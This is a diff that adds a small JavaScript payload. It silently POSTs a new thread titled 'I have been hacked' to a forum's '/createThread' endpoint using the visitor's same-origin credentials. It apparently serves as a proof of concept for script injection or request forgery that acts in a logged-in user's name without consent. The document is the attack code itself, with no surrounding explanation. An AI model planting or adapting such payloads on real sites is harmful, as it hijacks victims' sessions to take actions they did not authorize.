@@ -1,0 +1,6 @@
+
+const body = new URLSearchParams({
+  subject: "I have been hacked",
+  body: "This thread has been created without my consent"  
+});
+fetch(`/createThread?topic=webdev`, {method: "POST", body:body, credentials:"same-origin"}).then(() => {});
